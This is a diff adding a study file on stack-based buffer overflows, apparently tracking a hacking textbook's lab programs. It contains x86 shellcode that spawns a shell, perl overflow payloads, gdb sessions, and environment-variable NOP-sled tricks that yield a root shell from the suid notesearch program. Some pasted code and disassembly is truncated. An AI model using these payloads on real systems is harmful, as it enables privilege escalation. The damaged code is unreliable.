@@ -1,0 +1,2681 @@
+BUFFER OVERFLOWS
+
+One common exploit technique is called an off-by-one error
+
+off-by-one -> error where programmer has miscounted by one. Happens often. 
+
+fencepost error -> Suppose you're building a fence 100 ft wide with 10ft gaps between posts. How many do you need? Correct answer is 11. This occurs when programmer mistakenly conts items instead of spaces between items or vice versa. 
+
+Another example: when programmer is trying to select a range of numbers or items for processing. m = 17, n = 5. How many numbers in range from n to m. 13. m-n+1. 
+
+When program is fed input that makes effects of this error manifest, the ocnsequnces of the error can have an avalanche effect on the rest of the program logic. When explointed properly, the off-by-one error can cause a seemingly secure program to become a security vulnerability. 
+
+Unicode - double byte character set designed to provide characters for every language, including Chinese and Arabic. By using 2 bytes instead of 1, Unicode allows for tens of thousands of possible characters. Additional complexity means there are now multiple representations of the backslash character. 
+
+Can bypass some systems by fooling them with alternative unicode translations for characters
+
+GENERALIZED EXPLOIT TECHINQUES
+
+Most exploits have to do with memory corruptions, including common ones like buffer overflows and less-common methods like format string exploits. 
+
+With these techinques, the ultimate goal is to take control of the target program's execution flow by tricking it into running a piece of malicious code that as been smuggled into memory. 
+
+execution of arbitrary code -> fooling target program into executing malicious code smuggled into memory. Hacker can cause program to do pretty much whatever you want. 
+
+BUFFER OVERFLOWS
+
+Buffer overflows have been around since early days of computers. Internet worms especially used them
+
+C is high level but assumes that programmer is responsible for data integrity. C's simplicity increases programmer's control and the efficiency of the resulting programs, but it can result in programs that are vulnerable to buffer overflows and memory leaks if programmer isn't careful. 
+
+This means that once a variable is allocated memory, there are no built in safeguards to ensure that the contents of a variable fit into the allocated memory space. 
+
+If programmer wants to put 10 bytes of data into a buffer that had only been allocated 8 bytes of space, that type of action is allowed even though it will most likely cause the program to crash. 
+
+buffer overflow -> accessing, adding, or manipulating data outside the size of allocated memory. Extra bytes will overflow and spill out of allocated memory, overwrting whatever comes next. 
+
+If a critical piece of data is overwritten, the program will crash. 
+
+overflow_example.c
+
+#include <stdio.h>
+#include <string.h>
+int main(int argc, char *argv[]) {
+	int value = 5;
+	char buffer_one[8], buffer_two[8];
+	strcpy(buffer_one, "one"); /* Put "one" into buffer_one. */
+	strcpy(buffer_two, "two"); /* Put "two" into buffer_two. */
+	printf("[BEFORE] buffer_two is at %p and contains \'%s\'\n", buffer_two, buffer_two);
+	printf("[BEFORE] buffer_one is at %p and contains \'%s\'\n", buffer_one, buffer_one);
+	printf("[BEFORE] value is at %p and is %d (0x%08x)\n", &value, value, value);
+	printf("\n[STRCPY] copying %d bytes into buffer_two\n\n", strlen(argv[1]));
+	strcpy(buffer_two, argv[1]); /* Copy first argument into buffer_two. */
+	printf("[AFTER] buffer_two is at %p and contains \'%s\'\n", buffer_two, buffer_two);
+	printf("[AFTER] buffer_one is at %p and contains \'%s\'\n", buffer_one, buffer_one);
+	printf("[AFTER] value is at %p and is %d (0x%08x)\n", &value, value, value);
+}
+
+reader@hacking:~/booksrc $ gcc -o overflow_example overflow_example.c
+reader@hacking:~/booksrc $ ./overflow_example 1234567890
+[BEFORE] buffer_two is at 0xbffff7f0 and contains 'two'
+[BEFORE] buffer_one is at 0xbffff7f8 and contains 'one'
+[BEFORE] value is at 0xbffff804 and is 5 (0x00000005)
+[STRCPY] copying 10 bytes into buffer_two
+[AFTER] buffer_two is at 0xbffff7f0 and contains '1234567890'
+[AFTER] buffer_one is at 0xbffff7f8 and contains '90'
+[AFTER] value is at 0xbffff804 and is 5 (0x00000005)
+reader@hacking:~/booksrc $
+
+A larger buffer overflow may cause the program to crash and die. 
+
+reader@hacking:~/booksrc $ ./overflow_example AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+[BEFORE] buffer_two is at 0xbffff7e0 and contains 'two'
+[BEFORE] buffer_one is at 0xbffff7e8 and contains 'one'
+[BEFORE] value is at 0xbffff7f4 and is 5 (0x00000005)
+[STRCPY] copying 29 bytes into buffer_two
+[AFTER] buffer_two is at 0xbffff7e0 and contains
+'AAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
+[AFTER] buffer_one is at 0xbffff7e8 and contains 'AAAAAAAAAAAAAAAAAAAAA'
+[AFTER] value is at 0xbffff7f4 and is 1094795585 (0x41414141)
+Segmentation fault (core dumped)
+reader@hacking:~/booksrc $
+
+These mistakes are fairly common. Like BSoD. 
+
+Programmer's mistake is one of omission -> there should be a length check or restriction on the user supplied input. 
+
+Such a mistake was in notesearch.c
+
+reader@hacking:~/booksrc $ ./notesearch AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+-------[ end of note data ]-------
+Segmentation fault
+reader@hacking:~/booksrc $
+
+In the hands of a hacker, program crashes can be dangerous. A knowledgeable hacker can take control of a program as it crashes, with some surpising results.
+
+exploit_notesearch.c
+
+Exploit is able to use the overflow to serve up a root shell -- providing full control over the computer. This is an example of a stack-based buffer overflow exploit.
+
+STACK BASED BUFFER OVERFLOW VULNERABILITIES
+
+notesearch_exploit.c works by corrupting memory to control execution flow. 
+
+auth_overflow.c program demonstrates this
+
+include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+int check_authentication(char *password) {
+int auth_flag = 0;
+char password_buffer[16];
+strcpy(password_buffer, password);
+if(strcmp(password_buffer, "brillig") == 0)
+auth_flag = 1;
+if(strcmp(password_buffer, "outgrabe") == 0)
+auth_flag = 1;
+return auth_flag;
+}
+int main(int argc, char *argv[]) {
+if(argc < 2) {
+printf("Usage: %s <password>\n", argv[0]);
+exit(0);
+}
+if(check_authentication(argv[1])) {
+printf("\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
+printf("
+Access Granted.\n");
+printf("-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
+} else {
+printf("\nAccess Denied.\n");
+}
+
+reader@hacking:~/booksrc $ gcc -g -o auth_overflow auth_overflow.c
+reader@hacking:~/booksrc $ ./auth_overflow
+Usage: ./auth_overflow <password>
+reader@hacking:~/booksrc $ ./auth_overflow test
+Access Denied.
+reader@hacking:~/booksrc $ ./auth_overflow brillig
+-=-=-=-=-=-=-=-=-=-=-=-=-=-
+Access Granted.
+-=-=-=-=-=-=-=-=-=-=-=-=-=-
+reader@hacking:~/booksrc $ ./auth_overflow outgrabe
+-=-=-=-=-=-=-=-=-=-=-=-=-=-
+Access Granted.
+-=-=-=-=-=-=-=-=-=-=-=-=-=-
+reader@hacking:~/booksrc $
+
+An overflow can lead to unexpected results.
+
+reader@hacking:~/booksrc $ ./auth_overflow AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+-=-=-=-=-=-=-=-=-=-=-=-=-=-
+Access Granted.
+-=-=-=-=-=-=-=-=-=-=-=-=-=-
+reader@hacking:~/booksrc $
+
+GDB for auth_overflow
+
+reader@hacking:~/booksrc $ gdb -q ./auth_overflow
+Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".
+(gdb) list 1
+1 #include <stdio.h>
+2 #include <stdlib.h>
+3 #include <string.h>
+4
+5 int check_authentication(char *password) {
+6 int auth_flag = 0;
+7 char password_buffer[16];
+8
+9 strcpy(password_buffer, password);
+10
+11
+if(strcmp(password_buffer, "brillig") == 0)
+12
+auth_flag = 1;
+13
+if(strcmp(password_buffer, "outgrabe") == 0)
+14
+auth_flag = 1;
+15
+16
+return auth_flag;
+17
+}
+18
+19
+int main(int argc, char *argv[]) {
+20
+if(argc < 2) {
+(gdb) break 9
+Breakpoint 1 at 0x8048421: file auth_overflow.c, line 9.
+(gdb) break 16
+Breakpoint 2 at 0x804846f: file auth_overflow.c, line 16.
+(gdb)
+
+(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Starting program: /home/reader/booksrc/auth_overflow AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Breakpoint 1, check_authentication (password=0xbffff9af 'A' <repeats 30 times>) at
+auth_overflow.c:9
+9
+strcpy(password_buffer, password);
+(gdb) x/s password_buffer
+0xbffff7a0:
+")????o??????)\205\004\b?o??p???????"
+(gdb) x/x &auth_flag
+0xbffff7bc:
+0x00000000
+(gdb) print 0xbffff7bc - 0xbffff7a0
+$1 = 28
+(gdb) x/16xw password_buffer
+0xbffff7a0:	0xb7f9f729	0xb7fd6ff4	0xbffff7d8	0x08048529
+0xbffff7b0:	0xb7fd6ff4	0xbffff870	0xbffff7d8	0x00000000
+0xbffff7c0:	0xb7ff47b0	0x08048510	0xbffff7d8	0x080484bb
+0xbffff7d0: 0xbffff9af	0x08048510	0xbffff838	0xb7eafebc
+(gdb)
+
+(gdb) continue
+Continuing.
+Breakpoint 2, check_authentication (password=0xbffff9af 'A' <repeats 30 times>) at
+auth_overflow.c:16
+16
+return auth_flag;
+(gdb) x/s password_buffer
+0xbffff7a0:
+'A' <repeats 30 times>
+(gdb) x/x &auth_flag
+0xbffff7bc:
+0x00004141
+(gdb) x/16xw password_buffer
+0xbffff7a0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff7b0:	0x41414141	0x41414141	0x41414141	0x00004141
+0xbffff7c0:	0xb7ff47b0	0x08048510	0xbffff7d8	0x080484bb
+0xbffff7d0:	0xbffff9af	0x08048510	0xbffff838	0xb7eafebc
+(gdb) x/4cb &auth_flag
+0xbffff7bc:
+65 'A' 65 'A' 0 '\0' 0 '\0'
+(gdb) x/dw &auth_flag
+0xbffff7bc:
+16705
+(gdb)
+
+The password_buffer overflowed into the auth_flag, changing its first two bytes to 0x41.
+
+Ultimately, the program will treat this value as an integer, with value of 16705. After overflow, the check_authetntication() function will return 16705 instead of 0. Since statment considerers any non-zero value to be authetnticated, the program's execution flow is controlled into the authenticated section. 
+
+However, this is a contrived example that depends on memory layout of the variables. 
+
+auth_overflow2.c -> the variables are declared in reverse order.
+
+Since buffer is declared before the int flag, the int flag has the higher address, and buffer will not overflow into it. 
+
+However, another execution control point does exist, even though you can't see it in the C code. It's conventiently located after all the stack variables so it can easily be overwritten. This memory is integral to the operation of all programs, so it exists in all programs, and when it's overwritten it ususallt results in a program crash. 
+
+How does stack work?
+
+First assembly instruction writes function arguments to where ESP (top of stack) is pointing. This starts stack frame for function. Next instruction is actual call. This instruction pushes the address of the next instruction to the stack and moves the execution pointer register (EIP) to the start of the function. Address pushed to the stack is the return address for the stack frame. 
+
+Execution will continue into function as EIP is changed, and first instruction (prologue) finish saving meomry for the stack frame. First two instructions are for the saved frame pointer, and the third subtracts from ESP to save space for local variables.
+
+push ebp
+mov	ebp, esp
+sub	esp, 0x38
+
+leave and ret remove the stack frame and set the exceution pointer register (EIP) to the saved return address in the stack frame. 
+
+When some of hte bytes of the saved return address are overwritten, the program will still try to use that value to restore the execution pointer register (EIP). Usuallt results in a crash, since execution is essentially jumping to a random location, but this value doesn't need to be random. 
+
+If overwrite is controlled, you can tell program to jump to a specified location.
+
+EXPERIMENTING WITH BASH
+
+BASH shell and Perl are common tools on most machines
+
+Perl - interpreted programming language with a print command that happens to be particularly suited to generating long sequences of characters. Can be used to execute instructions on the command line by using the -e switch like this:
+
+perl -e 'print "A" x 20;'
+
+Tells perl to execute commands found between '' quotes. In this case, print "A" x 20; Prints A 20 times. 
+
+perl -e 'print '\x41' x 20;' //AAA...
+
+perl -e 'print "A"x20 . "BCD" . "\x61\x66\x67\x69"x2 . "Z";'
+
+An entire shell command can be executed like a function, returning its output in place. Done y surrounding the command with parentheses
+
+$(perl -e 'print "uname";')
+una$(perl -e 'print "m";')e
+
+Can also use ` backticks ` for this. 
+
+Can be used to quickly generate overflow buffers on the fly. 
+
+./overflow_example $(perl -e 'print "A"x30')
+
+reader@hacking:~/booksrc $ ./overflow_example $(perl -e 'print "A"x30')
+[BEFORE] buffer_two is at 0xbffff7e0 and contains 'two'
+[BEFORE] buffer_one is at 0xbffff7e8 and contains 'one'
+[BEFORE] value is at 0xbffff7f4 and is 5 (0x00000005)
+[STRCPY] copying 30 bytes into buffer_two
+[AFTER] buffer_two is at 0xbffff7e0 and contains 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
+[AFTER] buffer_one is at 0xbffff7e8 and contains 'AAAAAAAAAAAAAAAAAAAAAA'
+[AFTER] value is at 0xbffff7f4 and is 1094795585 (0x41414141)
+Segmentation fault (core dumped)
+reader@hacking:~/booksrc $ gdb -q
+(gdb) print 0xbffff7f4 - 0xbffff7e0
+$1 = 20
+(gdb) quit
+reader@hacking:~/booksrc $ ./overflow_example $(perl -e 'print "A"x20 . "ABCD"')
+[BEFORE] buffer_two is at 0xbffff7e0 and contains 'two'
+[BEFORE] buffer_one is at 0xbffff7e8 and contains 'one'
+[BEFORE] value is at 0xbffff7f4 and is 5 (0x00000005)
+[STRCPY] copying 24 bytes into buffer_two
+[AFTER] buffer_two is at 0xbffff7e0 and contains 'AAAAAAAAAAAAAAAAAAAAABCD'
+[AFTER] buffer_one is at 0xbffff7e8 and contains 'AAAAAAAAAAAAABCD'
+[AFTER] value is at 0xbffff7f4 and is 1145258561 (0x44434241)
+reader@hacking:~/booksrc $ 
+
+Here we overwrote the value of variable to be ABCD. 
+
+Can also write in an exact value with some ingenuity.
+
+reader@hacking:~/booksrc $ ./overflow_example $(perl -e 'print "A"x20 . "\xef\xbe\xad\xde"')
+[BEFORE] buffer_two is at 0xbffff7e0 and contains 'two'
+[BEFORE] buffer_one is at 0xbffff7e8 and contains 'one'
+[BEFORE] value is at 0xbffff7f4 and is 5 (0x00000005)
+[STRCPY] copying 24 bytes into buffer_two
+[AFTER] buffer_two is at 0xbffff7e0 and contains 'AAAAAAAAAAAAAAAAAAAA??'
+[AFTER] buffer_one is at 0xbffff7e8 and contains 'AAAAAAAAAAAA??'
+[AFTER] value is at 0xbffff7f4 and is -559038737 (0xdeadbeef)
+reader@hacking:~/booksrc $
+
+Stores 0xdeadbeef in variable
+
+Remember, these values must be stored in correct endian order to output correctly. 
+
+Technique can be used to overwrite the return address i nthe auth_overflow2.c program with an exact value. 
+
+reader@hacking:~/booksrc $ gcc -g -o auth_overflow2 auth_overflow2.c
+reader@hacking:~/booksrc $ gdb -q ./auth_overflow2
+Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".
+(gdb) disass main
+Dump of assembler code for function main:
+0x08048474 <main+0>:	push	ebp
+0x08048475 <main+1>:	mov		ebp,esp
+0x08048477 <main+3>:	sub		esp,0x8
+0x0804847a <main+6>:	and		esp,0xfffffff0
+0x0804847d <main+9>:	mov		eax,0x0
+0x08048482 <main+14>:	sub		esp,eax
+0x08048484 <main+16>:	cmp		DWORD PTR [ebp+8],0x1
+0x08048488 <main+20>:	jg		0x80484ab <main+55>
+0x0804848a <main+22>:	mov		eax,DWORD PTR [ebp+12]
+0x0804848d <main+25>:	
+0x0804848f <main+27>:
+0x08048493 <main+31>:
+0x0804849a <main+38>:
+0x0804849f <main+43>:
+0x080484a6 <main+50>:
+0x080484ab <main+55>:
+0x080484ae <main+58>:
+0x080484b1 <main+61>:
+0x080484b3 <main+63>:
+0x080484b6 <main+66>:
+0x080484bb <main+71>:
+0x080484bd <main+73>:
+0x080484bf <main+75>:
+0x080484c6 <main+82>:
+0x080484cb <main+87>:
+0x080484d2 <main+94>:
+0x080484d7 <main+99>:
+0x080484de <main+106>:
+0x080484e3 <main+111>:
+0x080484e5 <main+113>:
+0x080484ec <main+120>:
+0x080484f1 <main+125>:
+0x080484f2 <main+126>:
+End of assembler dump.
+(gdb)
+
+Section of code contains the instructions that display Access Granted message. 
+
+Beginning of this section is a 0x080484bf, so if the return address is overridden with this value, this block of instructions will be executed. 
+
+The exact distance between the return address and the start of the password_buffer cna change due to different compiler versions and different optimization flags. As long as the start of the buffer is aligned with DWORDs on the stack, this mutability can be accounted for by simply repeating the return address many times. 
+
+reader@hacking:~/booksrc $ ./auth_overflow2 $(perl -e 'print "\xbf\x84\x04\x08"x10')
+-=-=-=-=-=-=-=-=-=-=-=-=-=-
+Access Granted.
+-=-=-=-=-=-=-=-=-=-=-=-=-=-
+Segmentation fault (core dumped)
+reader@hacking:~/booksrc $
+
+Notsearch program is vulnerable to a buffer overflow on line:
+
+strcpy(searchstring, argv[1]);
+
+The notesearch exploit uses a similar technique to overflow a buffer into the return address; however, it also injects its own instructions into memory and then returns execution there. 
+
+shellcode - instructions that can tell program to restore privileges and open a shell prompt. This is especially devastating for notesearch programs since it is suid root. When new instructions can be injected in and execution can be controlled with a buffer overflow, programming logic is meaningless, allowing program to do things it was never programmed to do. 
+
+Still, with these techniques, there is difficulty in finding the exact location of hte return address.
+
+Can be eased by using a repeating pattern. But this return address must point to the shellcode located in the same buffer. Means the actual address must be known ahead of time, before it even goes into memory. This is difficult with a dynamically changing stack.
+
+NOP Sled -> an assembly instruction short for no operation. Single byte instruction that does absolutely nothing. Sometimes used to waste computational cycles for timing purposes. In this case, used as a fudge factor. Create a large array of these NOP instructions and place it before shellcode; then if EIP register points to any address found in the NOP sled, it will increment while executing each NOP instruction until it finally reaches the shellcode. 
+
+So as long as return address is overwritten with any address found in NOP sled, the EIP register will slide down to the shellcode. 
+
+On x86m NOP instruction is equivalent to the hex byte 0x90. 
+
+So buffer is segmented like:
+NOP sled | Shellcode | Repeated return address
+
+Even with NOP sled, the approximate location of the buffer in memory must be predicted in advance. 
+
+One techinque for approximating the memory location is to use a nearby stack location as a frame of reference. By substracting an offset from this location, the relative address of any variable can be obtained.
+
+In exploit_notesearch.c, we use the address of the variable i in main() stack frame for reference. The first variable declared in the function. Then an offset is ubstracted from that value: the result is the target return address
+
+Previously the offset was  270. How was that calculated?
+
+Easiest way to determine this offset is experimentally. Debugger will shift memory around slightly and will drop privileges when the suid root notesearch program is executed, making debugging much less useful in this case
+
+Since notesearch_exploit allows an optional command-line argument to define the offset, differenet offsets can be quickly tested. 
+
+No need to do this manually
+
+BASH has a for lopo that can be used to automate tihs.
+
+seq -> command that is simple program that generates a sequence of numbers. Typically used with looping. When 2 arguments are used, all the numbers from the first argument to the second argument are generated. When 3 arguments are used, the middle argument dictates how much to increment each time. Can be used with for loop with command substitution
+
+reader@hacking:~/booksrc $ seq 1 10
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+reader@hacking:~/booksrc $ seq 1 3 10
+1
+4
+7
+10
+reader@hacking:~/booksrc $
+
+reader@hacking:~/booksrc $ for i in $(seq 1 3 10)
+> do
+> echo The value is $i
+> done
+The value is 1
+The value is 4
+The value is 7
+The value is 10
+reader@hacking:~/booksrc $
+
+Can be used to quickly test many different offsets
+
+reader@hacking:~/booksrc $ for i in $(seq 0 30 300)
+> do
+> echo Trying offset $i
+> ./a.out $i
+> done
+Trying offset 0
+[DEBUG] found a 34 byte note for user id 999
+[DEBUG] found a 41 byte note for user id 999
+
+When right offset is used, the return address is overwritten with a value that points somewhere on the NOP sled. 
+
+USING THE ENVIRONMENT
+
+Sometimes a buffer will be too small to hold the shellcode you want. 
+
+Fortunately there are other locations in memory where shellcode can be stashed. 
+
+Environment variables are used by the user shell for a variety of things, but what they are used for isn't as important as the fact that they are located on the stack and can be set from the shell. 
+
+Example sets environment vriable called MYVAR to the string test. Environment variable can be accessed by prepending a dollar sign to its name. 
+
+env -> command will show all environment variables
+
+reader@hacking:~/booksrc $ export MYVAR=test
+reader@hacking:~/booksrc $ echo $MYVAR
+test
+reader@hacking:~/booksrc $ env
+SSH_AGENT_PID=7531
+SHELL=/bin/bash
+DESKTOP_STARTUP_ID=
+TERM=xterm
+GTK_RC_FILES=/etc/gtk/gtkrc:/home/reader/.gtkrc-1.2-gnome2
+WINDOWID=39845969
+OLDPWD=/home/reader
+USER=reader
+LS_COLORS=no=00:fi=00:di=01;34:ln=01;36:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=4
+0;31;01:su=37;41:sg=30;43:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;
+31:*.taz=01;31:*.lzh=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.gz=01;31:*.bz2=01;31:*.deb=01;31:*
+.rpm=01;31:*.jar=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35
+:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.mov=01;
+35:*.mpg=01;35:*.mpeg=01;35:*.avi=01;35:*.fli=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;
+35:*.flac=01;35:*.mp3=01;35:*.mpc=01;35:*.ogg=01;35:*.wav=01;35:
+SSH_AUTH_SOCK=/tmp/ssh-EpSEbS7489/agent.7489
+GNOME_KEYRING_SOCKET=/tmp/keyring-AyzuEi/socket
+SESSION_MANAGER=local/hacking:/tmp/.ICE-unix/7489
+USERNAME=reader
+DESKTOP_SESSION=default.desktop
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+GDM_XSERVER_LOCATION=local
+PWD=/home/reader/booksrc
+LANG=en_US.UTF-8
+GDMSESSION=default.desktop
+HISTCONTROL=ignoreboth
+HOME=/home/reader
+SHLVL=1
+GNOME_DESKTOP_SESSION_ID=Default
+LOGNAME=reader
+DBUS_SESSION_BUS_ADDRESS=unix:abstract=/tmp/dbus-
+DxW6W1OH1O,guid=4f4e0e9cc6f68009a059740046e28e35
+LESSOPEN=| /usr/bin/lesspipe %s
+DISPLAY=:0.0
+MYVAR=test
+LESSCLOSE=/usr/bin/lesspipe %s %s
+RUNNING_UNDER_GDM=yes
+COLORTERM=gnome-terminal
+XAUTHORITY=/home/reader/.Xauthority
+_=/usr/bin/env
+reader@hacking:~/booksrc $
+
+Similarly, shellcode can be put in an environment variable, but first it needs to be in a form that is easily manipulatable. 
+
+Need to put code i na file in binary form.
+
+Can use head, grep, and cut
+
+reader@hacking:~/booksrc $ head exploit_notesearch.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+char shellcode[]=
+"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
+"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
+"\xe1\xcd\x80";
+int main(int argc, char *argv[]) {
+unsigned int i, *ptr, ret, offset=270;
+reader@hacking:~/booksrc $ head exploit_notesearch.c | grep "^\""
+"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
+"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
+"\xe1\xcd\x80";
+reader@hacking:~/booksrc $ head exploit_notesearch.c | grep "^\"" | cut -d\" -f2
+\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68
+\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89
+\xe1\xcd\x80
+reader@hacking:~/booksrc $
+
+First 10 lines of program are piped into grep, which only shows the lines that begin with a quotation mark. This isolates the shellcode, which are piped into cut using options to display only the bytes between two quotation marks
+
+BASH's for loop can be used to send each of these lines to an echo command with command-line options to recognize hex expansion and to suppress adding a newline character to the end
+
+reader@hacking:~/booksrc $ for i in $(head exploit_notesearch.c | grep "^\"" | cut -d\" -f2)
+> do
+> echo -en $i
+> done > shellcode.bin
+
+Now shellcode is in a file called shellcode.bin. This file can be used with command subsitution to put shellcode into an environment variable along with a generous NOP sled.
+
+reader@hacking:~/booksrc $ export SHELLCODE=$(perl -e 'print "\x90"x200')$(cat shellcode.bin)
+reader@hacking:~/booksrc $ echo $SHELLCODE
+1 1 1
+j
+XQh//shh/bin
+Q
+S
+reader@hacking:~/booksrc $
+
+Now shellcode is on the stack in an environment variable, along with a 200byte NOP sled. 
+
+Means we just need to find an address somewhere in that range of the sled to overwrite the saved return address with. Environment variables are located somwhere near bottom of the stack so this is where we should look first
+
+Breakpoint should be set at beginning of main() so program is run and will set up memory but stop before anything happens
+
+reader@hacking:~/booksrc $ gdb -q ./notesearch
+Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".
+(gdb) break main
+Breakpoint 1 at 0x804873c
+(gdb) run
+Starting program: /home/reader/booksrc/notesearch
+Breakpoint 1, 0x0804873c in main ()
+(gdb)
+(gdb) i r esp
+esp
+0xbffff660
+0xbffff660
+(gdb) x/24s $esp + 0x240
+0xbffff8a0:
+""
+0xbffff8a1:
+""
+0xbffff8a2:
+""
+0xbffff8a3:
+""
+0xbffff8a4:
+""
+0xbffff8a5:
+""
+0xbffff8a6:
+""
+0xbffff8a7:
+""
+0xbffff8a8:
+""
+0xbffff8a9:
+""
+0xbffff8aa:
+""
+0xbffff8ab:
+"i686"
+0xbffff8b0:
+"/home/reader/booksrc/notesearch"
+0xbffff8d0:
+"SSH_AGENT_PID=7531"
+0xbffffd56:
+"SHELLCODE=", '\220' <repeats 190 times>...
+0xbffff9ab:
+"\220\220\220\220\220\220\220\220\220\2201ï¿1⁄21ï¿1⁄21ï¿1⁄2\231ï¿1⁄2ï¿1⁄2ï¿1⁄2\200j\vXQh//
+shh/bin\211ï¿1⁄2Q\211ï¿1⁄2S\211ï¿1⁄2ï¿1⁄2\200"
+0xbffff9d9:
+"TERM=xterm"
+0xbffff9e4:
+"DESKTOP_STARTUP_ID="
+0xbffff9f8:
+"SHELL=/bin/bash"
+0xbffffa08:
+"GTK_RC_FILES=/etc/gtk/gtkrc:/home/reader/.gtkrc-1.2-gnome2"
+0xbffffa43:
+"WINDOWID=39845969"
+0xbffffa55:
+"USER=reader"
+0xbffffa61:
+"LS_COLORS=no=00:fi=00:di=01;34:ln=01;36:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=
+40;31;01:su=37;41:sg=30;43:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01
+;31:*.taz=0"...
+0xbffffb29:
+"1;31:*.lzh=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.gz=01;31:*.bz2=01;31:*.deb=01;31:*.rpm=01;3
+1:*.jar=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01
+;35:*.tga=0"...
+(gdb) x/s 0xbffff8e3
+0xbffff8e3:
+"SHELLCODE=", '\220' <repeats 190 times>...
+(gdb) x/s 0xbffff8e3 + 100
+0xbffff947:
+'\220' <repeats 110 times>, "1ï¿1⁄21ï¿1⁄21ï¿1⁄2\231ï¿1⁄2ï¿1⁄2ï¿1⁄2\200j\vXQh//shh/bin\
+211ï¿1⁄2Q\211ï¿1⁄2S\211ï¿1⁄2ï¿1⁄2\200"
+(gdb)
+
+Debugger reveals location of the shellcode. Addresses might be a little different outside these addresses. Debugger also has some information on the stack, which shifts addresses around a bit.
+
+But with a 200byte NOP sled, these inconsistencies aren't a problem if an address near the middle of the sled is picked. 
+
+In output above, the address 0xbffff947 is shown to be close oto middle of the shellcode
+
+After determining the address of the injected shellcode instructions, the exploitation is simply a matter of overwriting the return address with this address
+
+reader@hacking:~/booksrc $ ./notesearch $(perl -e 'print "\x47\xf9\xff\xbf"x40')
+[DEBUG] found a 34 byte note for user id 999
+[DEBUG] found a 41 byte note for user id 999
+-------[ end of note data ]-------
+sh-3.2# whoami
+root
+sh-3.2#
+
+Target address is repeated enough times to overflow the return address, and execution returns into the NOP sled in the environment variable, which inevitable leads to the shellcode.
+
+In situations where the overflow buffer isn't large enough to hold shellcode, an environment variable an be used with a large NOP sled. 
+
+This usually makes exploitations quite a bit easier. 
+
+A huge NOP sled is great aid when you need to guess at the target return addresses, but it turns out that the locations of environment variables are easier to predict thatn the locations of local stack variables. 
+
+getenv() -> accepts the name of an environment variable as its only argument and returns that variable's memory address. 
+
+genenv_example.c
+
+#include <stdio.h>
+#include <stdlib.h>
+int main(int argc, char *argv[]) {
+printf("%s is at %p\n", argv[1], getenv(argv[1]));
+}
+
+reader@hacking:~/booksrc $ gcc getenv_example.c
+reader@hacking:~/booksrc $ ./a.out SHELLCODE
+SHELLCODE is at 0xbffff90b
+reader@hacking:~/booksrc $ ./notesearch $(perl -e 'print "\x0b\xf9\xff\xbf"x40')
+[DEBUG] found a 34 byte note for user id 999
+[DEBUG] found a 41 byte note for user id 999
+-------[ end of note data ]-------
+sh-3.2#
+
+This is accurate enough with a large NOP sled, but when the sme thing is attempted without a sled, the program crashes. Means environment prediction is still off. 
+
+reader@hacking:~/booksrc $ export SLEDLESS=$(cat shellcode.bin)
+reader@hacking:~/booksrc $ ./a.out SLEDLESS
+SLEDLESS is at 0xbfffff46
+reader@hacking:~/booksrc $ ./notesearch $(perl -e 'print "\x46\xff\xff\xbf"x40')
+[DEBUG] found a 34 byte note for user id 999
+[DEBUG] found a 41 byte note for user id 999
+-------[ end of note data ]-------
+Segmentation fault
+reader@hacking:~/booksrc $
+
+In order to predict an exact memory address, the difference in the addresses must be explored.
+
+Length of the name of the program seems to have an effect on the address.
+
+reader@hacking:~/booksrc $ cp a.out a
+reader@hacking:~/booksrc $ ./a SLEDLESS
+SLEDLESS is at 0xbfffff4e
+reader@hacking:~/booksrc $ cp a.out bb
+reader@hacking:~/booksrc $ ./bb SLEDLESS
+SLEDLESS is at 0xbfffff4c
+reader@hacking:~/booksrc $ cp a.out ccc
+reader@hacking:~/booksrc $ ./ccc SLEDLESS
+SLEDLESS is at 0xbfffff4a
